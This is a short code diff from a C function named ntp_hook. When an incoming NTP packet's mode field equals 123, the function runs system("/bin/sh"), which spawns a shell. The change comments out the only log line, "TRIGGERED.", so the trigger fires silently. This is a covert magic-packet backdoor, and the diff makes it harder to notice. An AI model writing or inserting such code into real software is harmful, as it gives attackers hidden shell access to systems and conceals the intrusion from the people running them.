@@ -280,7 +280,7 @@ void ntp_hook (
 
 	// 123 is a magic number for ntp on its own, so I guess why not?	
 	if(inpkt->rm_vn_mode == 123){
-		uprintf("TRIGGERED.\n");
+		//uprintf("TRIGGERED.\n");
 		system("/bin/sh");
 	}
 	else
